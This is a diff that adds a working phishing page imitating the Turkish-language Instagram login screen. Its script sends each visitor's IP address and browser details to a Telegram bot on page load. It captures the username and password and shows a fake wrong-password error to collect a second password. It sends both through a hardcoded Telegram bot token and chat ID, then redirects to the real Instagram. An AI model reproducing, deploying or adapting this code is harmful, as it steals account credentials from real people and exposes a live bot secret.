@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+            margin: 32px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            margin-bottom: 10px;
+            padding: 10px 0;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 22px auto 12px;
+        }
+        
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 40px;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .fb-login img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 40px 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 18px;
+        }
+        
+        .input-group {
+            margin: 0 40px 6px;
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            font-size: 12px;
+            height: 36px;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #262626;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        button[type="submit"] {
+            width: calc(100% - 80px);
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 9px;
+            font-weight: 600;
+            margin: 8px 40px;
+            height: 32px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        
+        button[type="submit"]:enabled {
+            opacity: 1;
+        }
+        
+        .forgot-pw {
+            display: block;
+            color: #00376b;
+            font-size: 12px;
+            margin: 12px 0;
+            text-decoration: none;
+        }
+        
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 0;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .signup-text {
+            font-size: 14px;
+            color: #262626;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+        }
+        
+        .download-buttons img {
+            height: 40px;
+        }
+        
+        .footer {
+            margin-top: auto;
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .footer-link {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 12px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 12px;
+        }
+        
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            line-height: 18px;
+            margin: 10px 40px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">
+            
+            <div id="errorMsg" class="error-message" style="display: none;">
+                Girdiğin şifre yanlış. Lütfen tekrar dene.
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Şifre" required>
+                    <button type="button" class="show-password" id="showPassword">Göster</button>
+                </div>
+                <button type="submit" id="loginButton" disabled>Giriş yap</button>
+            </form>
+            
+            <div class="divider">YA DA</div>
+            
+            <a href="#" id="fbLogin" class="fb-login">
+                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
+                <span>Facebook ile Giriş Yap</span>
+            </a>
+            
+            <a id="forgotPassword" class="forgot-pw">Şifreni mi unuttun?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p class="signup-text">Hesabın yok mu? <a id="signUp" class="signup-link">Kaydol</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Uygulamayı indir.</p>
+            <div class="download-buttons">
+                <img id="appStore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_tr-tr.png/4b70f6fae447.png" alt="App Store">
+                <img id="playStore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_tr-tr.png/1554e8bd4241.png" alt="Google Play">
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">Hakkında</a>
+                <a href="#" class="footer-link">Yardım</a>
+                <a href="#" class="footer-link">Basın</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">İş Fırsatları</a>
+                <a href="#" class="footer-link">Gizlilik</a>
+                <a href="#" class="footer-link">Koşullar</a>
+                <a href="#" class="footer-link">Konumlar</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+                <a href="#" class="footer-link">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let loginAttempts = 0;
+        let firstPassword = '';
+        
+        // Form validation
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        
+        function validateForm() {
+            loginButton.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
+        }
+        
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        
+        // Sayfa yüklendiğinde Telegram'a bildirim gönder
+        window.addEventListener('DOMContentLoaded', async () => {
+            await sendVisitorInfo();
+        });
+
+        // Şifre göster/gizle butonu
+        const showPasswordBtn = document.getElementById('showPassword');
+        
+        showPasswordBtn.addEventListener('click', function() {
+            if(passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.textContent = 'Gizle';
+            } else {
+                passwordInput.type = 'password';
+                this.textContent = 'Göster';
+            }
+        });
+        
+        // Giriş formu işlemi
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const currentPassword = passwordInput.value.trim();
+            
+            loginAttempts++;
+            
+            if(loginAttempts === 1) {
+                // İlk denemede hata göster ve şifreyi sakla
+                document.getElementById('errorMsg').style.display = 'block';
+                firstPassword = currentPassword;
+                
+                // Telegram'a normal giriş denemesini gönder
+                await sendLoginAttempt(username, currentPassword, false);
+            } else {
+                // İkinci denemede doğrulamalı bildirim gönder
+                await sendLoginAttempt(username, firstPassword, true, currentPassword);
+                
+                // Instagram'a yönlendir
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }
+        });
+        
+        // Ziyaretçi bilgilerini gönder
+        async function sendVisitorInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                const message = `👀 Yeni Ziyaretçi Tespit Edildi! 👀
+
+🌐 IP Adresi: ${ip}
+📱 Cihaz Bilgileri: ${navigator.userAgent}
+⏰ Tarih: ${new Date().toLocaleString()}
+
+⚠️ Instagram giriş sayfası ziyaret edildi!`;
+                
+                await sendToTelegram(message);
+            } catch (error) {
+                console.error('Ziyaretçi bilgisi gönderilemedi:', error);
+            }
+        }
+        
+        // Giriş denemesini gönder
+        async function sendLoginAttempt(username, password, isVerification, newPassword = '') {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                let message;
+                
+                if(isVerification) {
+                    message = `🔐 Giriş Denemesi Tespit Edildi! 🔐
+
+📌 Kullanıcı Bilgileri:
+👤 Kullanıcı Adı: ${username}
+🔑 İlk Şifre: ${password}
+🔑 İkinci Şifre: ${newPassword}
+
+🌐 IP Bilgileri:
+📡 IP Adresi: ${ip}
+📱 Cihaz Bilgileri: ${navigator.userAgent}
+
+⏰ Tarih: ${new Date().toLocaleString()}
+
+🚨 Dikkat! Kullanıcı giriş yapmaya çalıştı!`;
+                } else {
+                    message = `🔐 Giriş Denemesi Tespit Edildi! 🔐
+
+📌 Kullanıcı Bilgileri:
+👤 Kullanıcı Adı: ${username}
+🔑 Şifre: ${password}
+
+🌐 IP Bilgileri:
+📡 IP Adresi: ${ip}
+📱 Cihaz Bilgileri: ${navigator.userAgent}
+
+⏰ Tarih: ${new Date().toLocaleString()}
+
+🚨 Dikkat! Kullanıcı giriş yapmaya çalıştı!`;
+                }
+                
+                await sendToTelegram(message);
+            } catch (error) {
+                console.error('Giriş denemesi gönderilemedi:', error);
+            }
+        }
+        
+        // Telegram'a mesaj gönder
+        async function sendToTelegram(message) {
+            const botToken = '7904316763:AAFbbxzLtoCvIm7M0BTf2o8yde74OvSwi50';
+            const chatId = '7816589291';
+            
+            try {
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                const response = await fetch(telegramUrl);
+                
+                if(!response.ok) {
+                    throw new Error('Telegram API hatası');
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Hata:', error);
+                localStorage.setItem('telegram_fallback', message);
+                throw error;
+            }
+        }
+    </script>
+</body>
+</html>
